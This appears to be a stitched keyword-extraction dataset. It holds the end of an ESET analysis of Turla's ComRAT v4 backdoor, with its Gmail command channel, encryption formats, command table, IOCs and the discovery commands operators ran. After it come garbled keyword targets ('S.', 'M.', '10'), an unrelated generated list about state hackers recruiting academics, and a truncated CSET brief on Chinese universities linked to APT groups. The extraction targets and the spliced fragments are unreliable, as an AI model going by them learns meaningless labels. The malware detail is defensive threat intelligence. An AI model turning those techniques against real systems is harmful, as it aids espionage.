/etc/transport/mail/mailboxes/0/cookie.str (partially redacted)17Step 2It connects to the basic HTML view of Gmail at the URL url google com/mail/?ui=html&zy=g using the cookies described above. An example of such a view is shown Figure 21.Figure 21 // Example of the Gmail simplified HTML view(for demonstration purpose only)Step 3It parses the inbox HTML page using the Gumbo HTML parser in order to extract the list of emails. It will only read emails for which the Subject: is in the list at /etc/transport/mail/service/subject, as shown in Figure 22.Figure 22 // Contents of /etc/transport/mail/service/subjectThen, for each email, it extracts the link to download the attachment. The attachments are generally masquerading as documents with names such as document.docx and documents.xlsx. The body of the email is generally empty. Figure 23 is an example of an email sent by Turla operators to a ComRAT C&C mailbox.Figure 23 // Email from the Gmail inbox that contains commands in the attachment (partially redacted and opened in Microsoft Outlook for demonstration purposes only)18Step 4It downloads all the relevant attachments from Gmail. The email is then deleted so that it is not processed a second time. Step 5Despite their extensions, the attachments are not docx or xslx files. They contain a blob of data in the following format:(cid:31)(cid:30)(cid:29)(cid:28)(cid:28)+n<victim id>CRC(cid:20)(cid:19) of the encrypted data(cid:9)x(cid:9)(cid:7)AES(cid:3)encrypteddataThe AES-256 key is stored in the VFS in /etc/pki/aes_key and it uses AES in CBC mode with a null initialization vector. Step 6Once decrypted, we have access to the backdoor commands and parameters. We provide more details about the backdoor commands in section 4.6. Figure 24 is an example of a decrypted email attachment. 0x67 is the ID for “Execute a command with cmd.exe” and it is followed by the command to execute. We believe that the beginning of the decrypted data is filled with random bytes.Figure 24 // Decrypted attachmentStep 7The backdoor creates an attachment containing the result of the commands. The attachment name consists of 20 random digits and of the .jpg.bfe so-called double extension. Its content has the following format:(cid:31)(cid:30)(cid:29)(cid:28)(cid:27)(cid:26)(cid:25)(cid:27)(cid:26)(cid:25)+n<victim id>CRC(cid:20)(cid:19) of the encrypted data(cid:9)x(cid:9)(cid:7)RSA(cid:4)encryptedAES key (cid:1)+padding(cid:141)AES(cid:4)encrypteddataThe AES key is different for each email as it is randomly generated. Then, it is encrypted using RSA-2048 with the public key stored in /etc/pki/public_cert.pki. The format of the key is quite unusual as it is raw bytes representing the concatenation of n and e. Turla’s developers did not implement the RSA encryption themselves; they used code from the wolfSSL library and more specifically from a commit before March 2016.19Finally, and using the Gmail web interface as before, the backdoor sends the email to the address contained in /etc/transport/mail/mailboxes/0/answer_addr. This address is typically not hosted on Gmail but rather on GMX or VFEmail. It is also the email address from which the operators send commands to the Gmail address. Figure 25 is an example of an email created by ComRAT.Figure 25 // Email sent by ComRAT to the operators’ email address (partially redacted and openedin Microsoft Outlook for demonstration purposes only)4.6 Backdoor commands The operators can send commands using either of the C&C channels. The backdoor will receive the command ID and the arguments, if any.As seen in Table 1, the commands implemented in ComRAT v4 are not surprising and allow control of almost everything on the machine: manage files, execute additional processes or gather logs.Table 1List of backdoor commands in ComRAT v4ID Write in a file Read a file Execute a command with cmd.exe Set the timeout for the C&C channel Add an address in /etc/transport/legacy/get.list or in /etc/transport/legacy/post.list Send /var/log/working.c4log Load a PE from memory using an internal PE loader Load a PE from file using an internal PE loader Delete an address from /etc/transport/legacy/get.list or /etc/transport/legacy/post.list Get the configuration List a directory in the Virtual File System Execute a PE with CreateProcessW Invoke a PowerShell script from memory using a PowerShell runner Invoke a PowerShell script from a file using a PowerShell runner Delete the messages in the Gmail mailbox (added in the most recent version, first seen around November 2019)205. CONCLUSION Version four of ComRAT is a totally revamped malware family released in 2017. Its developers took inspiration from other Turla backdoors, such as Snake, to build a very complex piece of malware.Its most interesting features are the Virtual File System in FAT16 format and the ability to use the Gmail web UI to receive commands and exfiltrate data. Thus, it is able to bypass some security controls because it doesn’t rely on any malicious domain. We also noticed that this new version abandoned the use of COM object hijacking for persistence, the method that gave the malware its common name.We found indications that ComRAT v4 was still in use at the beginning of 2020, showing that the Turla group is still very active and a major threat for diplomats and militaries.We will continue to monitor Turla developments to help defenders protect their networks.Indicators of Compromise can also be found on GitHub. For any inquiries, or to make sample submissions related to the subject, contact us at: threatintel@eset com.216. BIBLIOGRAPHY 1 Yle. (2016, 01 13). Russian group behind 2013 Foreign Ministry hack. Retrieved fromurl fi/uutiset/osasto/news/russian_group_behind_2013_foreign_ministry_hack/85915482 Boutin, J.-I. (2017, 06 06). Turla’s watering hole campaign: An updated Firefoxextension abusing Instagram. Retrieved from url welivesecurity com/2017/06/06/ turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/3 Cherepanov, A. (2017, 06 30). TeleBots are back: Supply-chain attacks against Ukraine. (ESET) Retrieved fromurl welivesecurity com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/4 Cherepanov, A. (2018, 10). GREYENERGY: A successor to BlackEnergy. (ESET) Retrieved fromurl welivesecurity com/wp-content/uploads/2018/10/ESET_GreyEnergy pdf5 Corfield, G. (2020, 02 14). Austrian foreign ministry: ‘State actor’ hack on government IT systems is over.Retrieved from url theregister co uk/2020/02/14/austria_foreign_ministry_hack_turla_group_allegs/6 ESET. (2018, 08). Turla Outlook Backdoor. Retrieved fromurl welivesecurity com/wp-content/uploads/2018/08/Eset-Turla-Outlook-Backdoor pdf7 ESET Research. (2017, 03 30). Carbon Paper: Peering into Turla’s second stage backdoor. (ESET) Retrieved fromurl welivesecurity com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/8 ESET Research. (2017, 08). Gazing at Gazer - Turla’s new second stage backdoor. (ESET) Retrieved fromurl welivesecurity com/wp-content/uploads/2017/08/eset-gazer pdf9 ESET Research. (2018, 01). Diplomats in Eastern Europe bitten by a Turla mosquito. (ESET) Retrieved fromurl welivesecurity com/wp-content/uploads/2018/01/ESET_Turla_Mosquito pdf10 ESET Research. (2018, 05 22). Turla Mosquito: A shift towards more generic tools. Retrieved fromurl welivesecurity com/2018/05/22/turla-mosquito-shift-towards-generic-tools/11 Faou, M. (2019, 05). Turla LightNeuron. Retrieved fromurl welivesecurity com/wp-content/uploads/2019/05/ESET-LightNeuron pdf12 Faou, M. (2020, 03 12). Tracking Turla: New backdoor delivered via Armenian watering holes. Retrieved fromurl welivesecurity com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/13 Faou, M., & Dumont, R. (2019, 05 29). A dive into Turla PowerShell usage. Retrieved fromurl welivesecurity com/2019/05/29/turla-powershell-usage/14 G DATA. (2014, 03 07). Uroburos – Deeper travel into kernel protection mitigation. Retrieved fromurl gdatasoftware com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation15 G DATA. (2015, 01 15). Evolution of sophisticated spyware: from Agent.BTZ to ComRAT. Retrieved fromurl gdatasoftware com/blog/2015/01/23927-evolution-of-sophisticated-spyware-from-agent-btz-to-comrat16 Huss, D. (2017, 08 17). Turla APT actor refreshes KopiLuwak JavaScript backdoor for use in G20-themed attack. Retrieved from url proofpoint com/us/threat-insight/post/ turla-apt-actor-refreshes-kopiluwak-javascript-backdoor-use-g20-themed-attack17 Kaspersky GReAT. (2018, 10 04). Shedding Skin - Turla’s Fresh Faces. Retrieved fromurl com/shedding-skin-turlas-fresh-faces/88069/18 KNOWLTON, B. (2010, 08 25). Military Computer Attack Confirmed. (New York Times) Retrieved 04 09, 2018,from url nytimes com/2010/08/26/technology/26cyber html19 Managed Adversary and Threat Intelligence (MATI). (2019, 06 20). Waterbug:Espionage Group Rolls Out Brand-New Toolset in Attacks Against Governments. Retrieved from url broadcom com/blogs/threat-intelligence/waterbug-espionage-governments20 MELANI. (2016, 05 23). Technical Report about the Malware used in the Cyberespionage against RUAG.Retrieved from url melani admin ch/melani/en/home/dokumentation/reports/technical-reports/ technical-report_apt_case_ruag html2221 National Cyber Security Centre. (2017, 11 23). Turla group using Neuron and Nautilus tools alongsideSnake malware. Retrieved from url ncsc gov uk/static-assets/documents/Turla%20group%20using %20Neuron%20and%20Nautilus%20tools%20alongside%20Snake%20malware_1 pdf2223Schlee, M. (2018, 03 06). Hackers used Outlook for cyberattack on German government: report. Retrieved from url politico eu/article/report-hackers-used-outlook-for-cyberattack-on-german-government/Shevchenko, S. (2008, 11). Agent.btz - A Threat That Hit Pentagon. Retrieved from url threatexpert com/2008/11/agentbtz-threat-that-hit-pentagon html24 Tanase, S. (2015, 09 09). Satellite Turla: APT Command and Control in the Sky. Retrieved fromurl com/satellite-turla-apt-command-and-control-in-the-sky/72081/25 Untersinger, M. (2019, 01 29). Quelle est la bonne équation pour pacifier le cyberespace ? (Le Monde2019)Retrieved from url lemonde fr/pixels/article/2019/01/29/course-aux-cyberarmes-logiciels-destructeurs-dormants-le-difficile- apaisement-du-cyberespace_5416003_4408996 html26 Wikipedia. (n.d.). Abstract factory pattern. Retrieved 03 17, 2020, fromurl wikipedia org/wiki/Abstract_factory_pattern27 Wikipedia. (n.d.). Adapter pattern. Retrieved 03 17, 2020, fromurl wikipedia org/wiki/Adapter_pattern28 Wikipedia. (n.d.). Mediator pattern. Retrieved 03 17, 2020, fromurl wikipedia org/wiki/Mediator_pattern237.INDICATORS OF COMPROMISE7.1 HashesSHA-1 ComRAT orchestratorESET detection name PowerShell/Turla.X Win64/Turla.BY Win64/Turla.AP Win32/Turla.EI7.2 Paths%TEMP%\FXSAPIDebugTrace.txt %TEMP%\iecache.bin7.3 Windows registry(HKLM|HKCU)\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\ {59031A47-3F72-44A7-80C5-5595FE6B30EE} HKLM\SOFTWARE\Microsoft\SQMClient\Windows.WSqmCons7.4 Network foods.jkub[.]com progress.zyns[.]com scrabble.ikwb[.]com wekanda[.]tk248. MITRE ATT&CK TECHNIQUES T1086PersistenceT1053Scheduled TaskT1027Obfuscated Files or InformationT1055Process InjectionT1112Modify RegistryDescription A PowerShell script is used to install ComRAT. ComRAT uses a scheduled task to launch its PowerShell loader. The ComRAT orchestrator is stored encrypted and only decrypted at execution. The ComRAT orchestrator is injected into explorer.exe. The communication DLL is injected into the default browser. The ComRAT orchestrator is stored encrypted in the registry.Defense EvasionDiscoveryCollectionCommand and ControlExfiltrationT1016T1033T1069T1082Operators execute ipconfig and nbstat.System Network Configuration Discovery System Owner/User Discovery Permission Groups Discovery Operators execute net group /domain. System Information DiscoveryOperators execute systeminfo.Operators execute net user.T1083File and Directory DiscoveryT1087T1120T1135T1213T1024T1043T1071T1102 T1002 T1022T1048Account DiscoveryPeripheral Device DiscoveryNetwork Share Discovery Data from Information Commonly Used Port Alternative ProtocolOperators list the content of several directories. Example: dir /og-d “%userprofile%\AppData\ Roaming\Microsoft\Windows\Recent\*.*”. Operators execute net user and net group. Operators execute fsutil fsinfo drives to list the connected drives. Operators execute net view. The Operators use a custom tool to exfiltrate documents from an internal central database.ComRAT uses RSA and AES to encrypt C&C data.ComRAT uses ports 80 and 443.ComRAT uses HTTP and HTTPS.ComRAT can be controlled via the Gmail web UI. The documents are compressed in a RAR archive. The RAR archive is encrypted with a password. Data is exfiltrated to cloud storage, mounted locally using the net use command. ","{'phrases': ['Turla operators', 'the victim', 'means', 'hole attacks', 'S.', 'use', 'access', 'ComRAT', 'a PowerShell script', 'a scheduled task', 'the orchestrator', 'the default web browser', 'Control', 'the Gmail web interface', 'The Operators', 'Send', 'commands', 'sensitive documents', 'the documents', 'Cloud storage', 'HTTPS', 'M.', '10', 'addition', 'malware tools', '11'], 'target': 'Turla operators; the victim; means; hole attacks; S.; use; access; ComRAT; a PowerShell script; a scheduled task; the orchestrator; the default web browser; Control; the Gmail web interface; The Operators; Send; commands; sensitive documents; the documents; Cloud storage; HTTPS; M.; 10; addition; malware tools; 11.'}"
Chinese; state; hacking teams; use; ML; reconnaissance; targets; vulnerabilities; detection; use; ML; techniques; lateral movement; lateral movement; the network; lateral movement; EC; the infrastructure; RAR; tools; lateral movement; the environment; analysis; the use; ML; operational capabilities; time; analysis; analysis; tactics; time.,"[' 1. State-sponsored groups recruit talent from universities conducting cutting-edge AI and cybersecurity research. 2. The groups likely provide funding or data to guide the academic research toward operational needs. 3. Researchers develop techniques for exploiting systems, evading detection, discovering vulnerabilities, etc. 4. Promising research is transitioned by the hacking groups into new tradecraft and operational capabilities. 5. The groups employ the new AI/ML techniques in cyber operations for espionage, surveillance, or sabotage. 6. Rapid experimentation and implementation accelerates the development cycle from lab to operations. ']","Extract the keywords: March 2021Academics, AI, and APTs How Six Advanced Persistent Threat-Connected Chinese Universities are Advancing AI Research CSET Issue BriefAUTHOR Dakota CaryExecutive SummaryTurning cutting-edge research into operational capabilities is the currency of cyber operations. The vulnerability no one else knows about, one found by someone with highly specific knowledge of a program or coding language, opens a backdoor into an adversary’s most sensitive vault. A better understanding of one technology or technique can give cyber operators an advantage over opponents. Governments benefit from compressing the timelines from discovery to exploitation, more rapidly using the insights of researchers for operations.Artificial intelligence (AI) and its current dominant paradigm, machine learning (ML), almost certainly will not fundamentally alter competition in cyberspace. That said, AI systems will provide both new terrain for cyber operations—as targets that can themselves be hacked—and new tools of cyber operations, as ML aids offensive and defensive efforts. China’s military-civil fusion strategy takes a holistic approach to development and aims to seamlessly incorporate private resources and developments for state use, with the goal of shortening the pathway for non- governmental research on AI and cybersecurity to strengthen and diversify government operational capabilities.1There is notable precedent for using university developments in state-sponsored hacking operations. Over the past decade, China’s security services have repeatedly turned to select university faculty to conduct research on cyber techniques and, in some cases, run cyber operations. Collaboration between university faculty and cyber operators illustrates China’s approach to military-civil fusion. This report identifies six universities that previously worked with China’s state-sponsored hacking teams and are now conducting research on the use of ML for cyber capabilities; two universities also host research programs on cyber attack and cyber defense of AI systems. This report summarizes the extent to which these universities, with ties to known state-sponsored hacking teams, might aid China’s efforts in these areas.Center for Security and Emerging Technology | 1Key Findings● Multiple universities with connections to Advanced Persistent Threat (APT) cyber actors are conducting research on the intersection of cybersecurity and ML. All six universities employ faculty who are actively conducting research on ML and cybersecurity. At least one known state- backed hacker is researching how to use ML for anomaly detection, a defensive cybersecurity technique. Shanghai Jiao Tong University’s School of Information Security Engineering, a school with ties to the PLA, hosts a research institute conducting research on offensive and defensive cybersecurity techniques; the director of that institute published an analysis of ML and cybersecurity trends in a Ministry of State Security periodical. Research on cybersecurity and AI is moving from academic journals to strategy forums for China’s security services.● Research conducted on the application of machinelearning and AI to cybersecurity is extensive, particularly in the areas of anomaly detection systems, malware classification, behavior analysis, and active defense. Most papers published by faculty from these universities examined how to use machine learning for defensive purposes. Offensively oriented papers noted ML’s application to vulnerability discovery and exploitation—a dual-use technique that can secure or wreck software. One paper published by an author at Xidian University and funded by the Key State Laboratory for Information Security’s Unclassified Projects Fund concluded that ML could bolster cyber defenses and improve vulnerability discovery.● Research on the attack and defense of AI systems wasless pervasive than research on applying the technology to cybersecurity. Two schools favored for recruiting cyber operators for specific hacking groups are researching the vulnerability of AI systems. Zhejiang University offers classes on the attack and defense of AI systems, alongside classes on how to write intelligence reports.2 HarbinCenter for Security and Emerging Technology | 2Institute of Technology is conducting research on the topic, but does not publish its progress.Governments’ use of new technologies affects their relative power and influence in the modern world. Nations that innovate faster and more effectively often build and sustain an advantage over their rivals. In such a competition, ML has the potential to be a game-changing technology, and both China and the United States are racing to exploit its power. More narrowly, the application of ML techniques to traditional cyber operations may prove to be transformative, altering operations’ practice and amplifying their potency. Since these operations are a fundamental part of modern statecraft, having an operational advantage, even if only for a moment, can yield lasting gains for governments. By examining the research at select universities, analysts and decisionmakers can better determine how China may try to apply AI and machine learning techniques to cyber operations in search of this advantage. If the cross-pollination from academic research teams to fielded operations occurs for ML-enabled cyber capabilities as it did in earlier cyber operations, then understanding the depth and breadth of the schools’ work can shed light on future operational developments and their potential security impacts.Center for Security and Emerging Technology | 3Table of ContentsExecutive Summary 1 Key Findings 2 Hainan University () 9 Connections to the Security Services 9 Research on AI/ML + Cybersecurity 9 Southeast University () 9 Connections to the Security Services 9 Research on AI/ML + Cybersecurity 11 Shanghai Jiao Tong University () 12 Connections to the Security Services 12 Research on AI/ML + Cybersecurity 14 Xidian University () 16 Connections to the Security Services 16 Research on AI/ML + Cybersecurity 17 Zhejiang University () 19 Connections to the Security Services 19 Research on AI/ML + Cybersecurity 20 Harbin Institute of Technology () 23 Connections to Security Services 23 Research on AI/ML + Cybersecurity 23 Endnotes 27Center for Security and Emerging Technology | 4IntroductionProfessor Gu Jian () splashed cash on whoever could help him. Standard password cracking techniques and dictionary attacks served no use for the professor—he needed innovators. Only the top talent would do and he did what he could to lure it out. “Believe it or not, our professor has a lot of money,” one student said of Professor Gu.3 With payouts up to RMB 500K ($73,000), the professor threw large sums of money at his problems.4 “Our teacher says if no one can crack it this time, then he’ll increase the money on offer,” the student said.5 Outside of his classroom, Professor Gu scouted talent at hacking competitions on Hainan University’s campus and encouraged students to attend by offering cash prizes from one of his shell companies. That company, Hainan Xiandun Technology Company, even listed its address of incorporation as the university’s library.6As a former PLA officer in the Guangzhou Military Region’s Political Department, Professor Gu was a natural choice for Hainan’s State Security Bureau when it sought to stand up its hacking operations. Gu Jian served as a professor in the Information Security Department of Hainan University and used his position to run state-sponsored hacking operations. Beginning in 2013, Professor Gu posted job listings on internal university boards, hosted hacking competitions where he scouted for talent, and offered bounties on technical capabilities to his students and coworkers. By the time Intrusion Truth—a cybersecurity blog rumored to be a front for a national intelligence agency—outed Professor Gu and his government contact in early 2020, his hacking team had already victimized companies in the U.S. defense industrial base.7 Cybersecurity professionals assigned Professor Gu’s state-sponsored team a standardized designation, Advanced Persistent Threat 40 (APT40); it was a sign that the hackers were notable operators.Professor Gu’s experience running a state-sponsored APT is not an aberration. Both the Ministry of State Security (MSS) and the People’s Liberation Army (PLA) have used universities and their employees to support and conduct cyber operations for many years.8 Six schools deserve particular scrutiny.Center for Security and Emerging Technology | 5The universities analyzed in this report were chosen because of their connections to known hacking groups. Universities qualified for inclusion if they: 1) previously conducted cyber operations (Hainan University, Southeast University, and Shanghai Jiao Tong University), 2) partnered with specific divisions of the security services that conduct cyber operations (Xidian University), or 3) were noted by US cyber threat intelligence companies as places of recruitment for APTs (Zhejiang University and Harbin Institute of Technology). Other universities, aside from these six, also contribute to China’s cyber capabilities albeit without apparent connection to specific APTs, thus falling below the threshold for analysis of this report.9China’s Science of Military Strategy, a government publication of military doctrine and strategic thinking put forward by the PLA’s Academy of Military Science, has long emphasized the integration of civilians into the military’s information warfare operations, the domain that includes cyber operations.10 The CCP’s strategy of military-civil fusion aims to leverage private resources for government use. Recent reporting shows that the MSS tasks some companies to analyze bulk data collected from cyber espionage operations—exemplifying one way MCF is put into practice in the cyber domain.11 Whereas other countries’ security services may contract with consenting and interested companies, non- government entities in China accept working with the CCP as a cost of doing business; rejecting the Party’s requests may be the death-knell for an organization. As China’s security services compete for access to information, cyber operators can leverage close relationships with universities to develop new tactics, techniques, and procedures. This quest for new capabilities pushes academics and operators into new areas of research. The integration of universities and state-sponsored espionage shortens the time required to turn academic research into operational capabilities and creates a window into operators’ possible research priorities. Understanding current research can provide insights, and potentially indicators, into possible future capabilities and intentions. Research applying machine learning to offensive techniques and defensive tactics offers China’s security services new tools to leverage; research on the attack and defense of AICenter for Security and Emerging Technology | 6systems opens a new battlespace for contest. Competition begets innovation.It is not this research, in and of itself, that warrants attention. Research on machine learning and AI for cybersecurity, and the attack and defense of those same systems are normal topics for computer science researchers for good reason: machine learning offers new tools for cybersecurity professionals to deploy. ML- based cyber threat detection, malware classification, and inspection of encrypted data flows all promise future gains for cybersecurity. By the same token, AI systems themselves must be secured from attackers. Vulnerable systems proliferate as companies monetize algorithms and governments deploy new tools. Defending these systems requires anticipating how they may be attacked, so researching attack methodologies is one way to gain insight into adversaries’ efforts, which in turn could inform efforts to bolster defenses. This dual-use nature of cybersecurity research tints the lens of analysis.This paper examines the relationship between China’s state- backed hacking teams, six universities, and the AI/ML research they do that may affect future cyber operations. To do that, this paper draws on open sources12 to study the relationship between the MSS, the PLA’s Strategic Support Force (PLASSF), which is responsible for computer network operations and technical reconnaissance, and these institutions.13 The author examined university webpages for each school’s cybersecurity () program and information security () program. Faculty web pages with biographical information claiming connection to the security services, and research related to AI/ML are analyzed below. University or government documents from public file sharing sites, such as Baidu Wenku, bearing related search terms are also included. Findings regarding academic papers from the China National Knowledge Infrastructure (CNKI) database reflect papers published by each school’s respective degree programs that the CSET data team has determined to be related to AI/ML.Center for Security and Emerging Technology | 7FindingsThis table provides a brief overview of all six universities affiliated with Chinese state-backed APTs; whether the cybersecurity program at these schools offers courses on AI and machine learning; whether professors at the school are conducting research on AI and cybersecurity; and if the institution is on the U.S. Commerce Department Bureau of Industry and Security’s Entity List. The following subsections provide more details on the links between each university and the security services, as well as any relevant research conducted by faculty and staff of the institution.Institution’s Name inEnglishInstitution’sName in MandarinAffiliated APTsCybersecurityCoursesInclude AI/ML?Individual AI/ML andCybersecurity?US Government BIS Entity List14Hainan UniversityAPT40UnknownSoutheast University Deep PandaYesShanghai Jiao TongUniversityAPT1Xidian University APT3Zhejiang UniversityAPT1YesYesYesYesYesYesYesYesNoNoNoNoNoHarbin Institute ofTechnologyAPT1UnknownYesYesCenter for Security and Emerging Technology | 8Hainan University ()Connections to the Security ServicesHainan University employed a professor conducting cyber operations with APT40, which Intrusion Truth attributed to the Hainan Bureau of the MSS (see introduction).15Research on AI/ML + CybersecurityWebsites for the Hainan University cybersecurity school and related research institutions either failed to load or required passwords to access. It is unclear why the Hainan University Cybersecurity Department’s website is password protected—an uncommon security protocol compared to other universities examined in this report. The increased security measures may well have been implemented following the revelation of the school’s association with APT40, but this is not easily discernable.A search of available academic papers uncovered one paper published on using ensemble learning methods, a machine learning framework, to create an early warning system for distributed denial of service attacks.16 Hainan University has not published any other research related to AI/ML and cybersecurity.Southeast University ()Connections to the Security ServicesProfessor Song Yubo () and Beijing TopSec, a company known to provide cybersecurity services to the PLA and MSS, hosted a hacking competition in early 2014 for Southeast University students.17 Unlike normal capture-the-flag competitions where participants hack other teams for points, Professor Song offered students a real-world opportunity to earn points and gain prestige by attempting to access the network of a U.S. DoD contractor, VAE, Inc.18In preparing the computer infrastructure for the hacking competition, Professor Song accidentally left a trail of indicators connecting him, the competition, and the VAE operation. Song setCenter for Security and Emerging Technology | 9up websites meant to fool VAE employees into giving up their credentials in the days leading up to the competition; VAE confirmed spearphishing attempts at the same time as the competition.19 Not only did the timing of the websites align with the competition, but Song used the same registration company and naming conventions to create both the competition registration website and the websites used for the hacking operation. Such overlapping procedures could be coincidental; one registration company can serve many clients. But, Song also made an operational security error when compiling his malware, by accidentally programming his malware to call back to the same IP address he used to register the competition’s website, connecting him, the competition, and the malicious websites.20Months after the attempted attacks on VAE, Inc., the same malware from the competition was found on a website targeting Anthem Insurance employees.21 The 2019 DOJ indictment of Chinese hackers for the Anthem Insurance hacks did not name Song, however. The relative exclusivity of the malware and its connection to Deep Panda, the Crowdstrike designation for a Chinese state-sponsored hacking team, suggests that Song and the team that hacked Anthem Insurance had access to the same tools—either through sharing or centralized distribution.22 Moreover, Song registered the malicious VAE websites using the name of a Marvel comic book character—the same theme used to register infrastructure for the hack of the U.S. Office of Personnel Management, another major Chinese operation.23Aside from Song Yubo, Southeast University has a strong institutional relationship with China’s information warfare programs. A 2012 report prepared for the U.S.-China Economic and Security Review Commission by Northrop Grumman determined that Southeast University faculty—including Song24— received regular funding from five programs for “the modernization of state secrecy, the technical professionalization of the PLA, and the continuing development of information conflict capabilities.”25 As of 2012, funds from these five programs—the 863 National High Technology Research and Development Program ( ), the 973 National Key Basic Research Program ( ), the National 242 Information SecurityCenter for Security and Emerging Technology | 10Program ( 242 ), Ministry of State Security 115 Program ( 115), and the National S219 Information Security Application Demonstration Project ( S219  )—were selectively distributed to a small group of universities; it is unclear if these programs are still disbursing funds. Only two other universities, Harbin University and Zhejiang University, received funding from all five information warfare projects as of 2012—both are tied to APTs and covered in this report.Southeast University continues to build upon its relationship with the security services in the information domain. A university webpage touts Southeast University partnering with the PLA Strategic Support Force to establish the Purple Mountain Internet Communications and Security Research Lab ( ), which opened in 2018.26 PLA SSF researchers and Southeast University faculty at the lab work together on “important strategic requirements”, computer operating systems, and interdisciplinary cybersecurity research.27 In the same year, the university established a “security self-investigation and self- correction working group” for the cybersecurity academy’s “laboratory and important venues”—perhaps to guard against insider threats to research.28 Other engagements revolve around hands-on learning and job placement. Southeast University connects students to the security services via job postings and research positions. One post-doctoral position with the MSS 13th division works on “APT attack detection, and vulnerability discovery and exploitation.”29 A web page for prospective students highlights that graduates often go on to work for the MSS, among other possible careers.30Research on AI/ML + CybersecurityProfessor Song, the academic who facilitated the VAE, Inc. hacking competition, is now researching how to use machine learning for anomaly detection—a technique that looks for unusual patterns of network behavior.31 Song is just one of many Southeast University professors who has accepted funding from any of the three secretive funding programs for information security research. Dr. Jiang Rui (), a three-time recipient of MSS 115 Program (Center for Security and Emerging Technology | 11 115) funding, is currently researching data protection technology for distributed machine learning systems on behalf of the Ministry of Public Security.32 Other professors also received MSS 115 Program ( 115) or National 242 Information Security Program ( 242 ), but do not conduct ML-related cybersecurity research. Another group of Southeast University faculty also research ML and cybersecurity, but do not appear to receive government funding for their research. Li Tao () focuses on smartphone security and vulnerabilities, and claims to research AI applications for cybersecurity, but has only listed one publication related to AI.33 Qin Zhongyuan () researches AI for malware classification and attack detection systems—both applications help defenders fortify networks.34 Another professor, Yang Wang (), invites student applicants to assist with his research on cyber threat intelligence, cyberattack attribution technologies, and security challenges for AI systems.35 According to Yang’s webpage, applicants for research positions should be familiar with machine learning, cybersecurity posture awareness technology, and threat intelligence modeling and analysis.36 The requisite skills for applicants and declared direction for the research project— automated cybersecurity response ()—suggests a focus on ML-based anomaly detection and threat attribution technologies.Shanghai Jiao Tong University ()Connections to the Security ServicesThe first murmurs of Shanghai Jiao Tong University’s (SJTU) relationship with state-sponsored hackers date back as far as 2010. In an article published by The New York Times, unnamed military contractors provided evidence that someone at SJTU was conducting network operations against foreign targets, including Google and the U.S. government.37 Three years passed before evidence of the relationship surfaced again.Center for Security and Emerging Technology | 12In 2013, Mandiant published its ground-breaking APT1 report that named PLA Unit 61398 as an Advanced Persistent Threat to the U.S. government and non-Chinese companies. Based on the attribution of attacks to Unit 61398, investigative reporters at Reuters identified three computer science articles that SJTU academics co-authored with members of Unit 61398.38 One of the academic authors implausibly claimed he was unaware of his co- author’s ties to the PLA—insisting that the co-author was a graduate student—even though a military unit designation appeared next to the operator’s name on the paper.39 The technical articles demonstrated that the academics were directly contributing to research that could be used for network operations and were doing that research alongside people from military units carrying out those operations. The Reuters journalists also determined that SJTU’s School of Information Security Engineering () was co-located on an “Information Security Engineering Base” run by the PLA, establishing another clear connection between SJTU and the PLA. Following the DOJ indictments of Unit 61398 a year later, another report found that one of the hackers had used his university email address to register infrastructure used in a hacking campaign.40 Rumors about SJTU and its connection to Chinese government cyber operations evolved into irrefutable facts over the four years from 2010 to 2014.This report finds that the relationship between SJTU and state- sponsored hacking teams almost certainly continues today. The SJTU’s Cyberspace Security Science and Technology Research Institute () stands out for its potential impact on cyber operations and as a vehicle for cooperation. The Network Confrontation and Information System Security Testing () project works on “network and information system testing and evaluation, security testing for intelligent connected networks, APT attack testing and defense, and key cyber range technology.”41 Research priorities, like “APT attack testing and defense,” explicitly state the intent to develop offensive and defensive technologies for APT (read: government-backed) cyber operations. Other enumerated areas of research include “password cracking, social engineering, andCenter for Security and Emerging Technology | 13creating active honeynets.”42 Password cracking and social engineering are used to gain unauthorized network access and are offensively oriented. While penetration testers can use these tactics against consenting organizations to improve their defensive posture, the institute makes no mention of providing such services. The most likely application is for offensive cyber operations. Additionally, SJTU hosts a few AI research organizations, including the AI Security Laboratory, whose mission is to increase the security and defenses of ML algorithms.43Besides this research, the biographies of two professors stand out for their stated impact on the security services. Dr. Qiu Weidong’s ( ) research on AI and graphical processing unit optimization—a key component for training AI systems—led to the widespread adoption of his cryptographic techniques by ""many core national security ministries,"" presumably including the security services.44 Another professor, Dr. Chen Xiaohua (), served as the Executive Deputy Director ()—likely second or third in the chain of command—of the national-level MSS 13th Bureau, known publicly as the China Information Technology Security Evaluation Center (CNITSEC), before becoming a professor.45 Standard-setting cryptographical research and experience running a bureau of an intelligence service are good indicators of SJTU’s reputation among cybersecurity professionals in China.Research on AI/ML + CybersecurityResearchers at Shanghai Jiao Tong University published seven papers on using AI for defensive purposes over the last five years. Researchers published on defensive ML applications such as identifying malicious URLs46, inspecting web traffic to identify botnets47, attributing certain types of DDOS attacks48, and a litany of specialized intrusion detection systems.49 Other research topics have dual-use applications. One paper funded by the Ministry of Public Security researched the application of machine learning for static vulnerability analysis of software.50 Vulnerability analysis finds weaknesses in software that can be patched by defenders or exploited by attackers; how vulnerabilities are used after their discovery is up to the user. Another paper proposed a machine learning model that could differentiate Tor web traffic from otherCenter for Security and Emerging Technology | 14traffic—a tool that would allow a state with comprehensive surveillance and collection capabilities to isolate otherwise obscured internet connections; China has obvious incentives to use such a tool.51 Other work sheds the veneer of dual-use research and benefits only attackers. A paper published in 2019 increased the accuracy of password guessing attacks by using a machine learning model to generate password attempts.52In addition to the work of individual professors, the Network Confrontation and Information System Security Testing ( ) project, mentioned above, also conducts research on the use of AI and machine learning for computer network attack and defense. Though sourcing for this assertion is limited, the documents available speak volumes. The MSS 13th Bureau published an article by the director of the SJTU research institute in its Cyberspace Strategy Forum periodical.53 The article considers the potential offensive and defensive applications of AI in computer network operations, as well as the vulnerabilities of AI systems themselves. In one section, the director—concurrently the director for the National Engineering Laboratory for Information Content Analysis Technology ()— highlights using AI to repair software vulnerabilities, support network attack and defense, and find software vulnerabilities for exploitation in the malware development process.54 The piece concludes by making two arguments. First, AI holds potential for defensive cybersecurity applications like intrusion detection, threat intelligence management, and the ability to construct intelligent- secure networks (). Second, it contends that further research on AI is the solution to AI’s current vulnerabilities. The publication of the article by the MSS 13th Bureau demonstrates the service’s interest in such capabilities and illustrates the deference it pays to the research and analysis of SJTU faculty.Besides the publication, two other pieces of 